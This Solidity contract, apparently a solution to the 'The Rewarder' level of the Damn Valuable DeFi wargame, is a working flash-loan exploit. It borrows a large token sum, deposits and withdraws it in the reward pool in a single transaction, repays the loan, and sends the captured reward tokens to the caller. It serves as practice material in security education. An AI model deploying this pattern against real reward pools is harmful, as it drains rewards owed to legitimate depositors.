//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import { RewardToken } from "./RewardToken.sol";
import "../DamnValuableToken.sol";


contract AttackRewarder {
    //DamnValuableToken public immutable liquidityToken;
    //uint256 public constant REWARDS = 100 ether;
    
    FlashLoanerPool public immutable pool; 
    TheRewarderPool public immutable rewarder;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;

    uint256 public constant LOAN_AMOUNT = 1000000 ether;

    constructor(FlashLoanerPool _pool, TheRewarderPool _rewarder, address liquidityTokenAddress, address rewardTokenAddress){
        pool = _pool;
        rewarder = _rewarder;
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardToken = RewardToken(rewardTokenAddress);
    }

    function getLoan() public {
        pool.flashLoan(LOAN_AMOUNT);
        console.log("Loan granted");
    }

    function receiveFlashLoan(uint256 amount) public {
        liquidityToken.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        rewarder.withdraw(amount);
        liquidityToken.transfer(address(pool), amount);
    }

    function getTokens() public {
        uint256 totalTokens = rewardToken.balanceOf(address(this));
        console.log("Reward balance:");
        console.log(totalTokens);
        rewardToken.transfer(msg.sender, totalTokens);
    }

}